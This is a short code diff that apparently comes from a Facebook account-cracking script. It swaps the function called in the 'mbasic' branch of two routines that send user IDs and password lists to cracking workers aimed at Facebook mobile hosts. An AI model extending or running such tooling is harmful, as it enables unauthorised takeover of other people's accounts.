@@ -1471,7 +1471,7 @@ def metslow():
                 elif "reguler" in method:
                     pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                 elif "mbasic" in method:
-                    pool.submit(crackbasi, idf, pwv)
+                    pool.submit(reghehe, idf, pwv)
                 else:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
     print("")
@@ -1538,7 +1538,7 @@ def metcepat():
                 elif "reguler" in method:
                     pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                 elif "mbasic" in method:
-                    pool.submit(crackbasi, idf, pwv)
+                    pool.submit(reghehe, idf, pwv)
                 else:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
     print("")
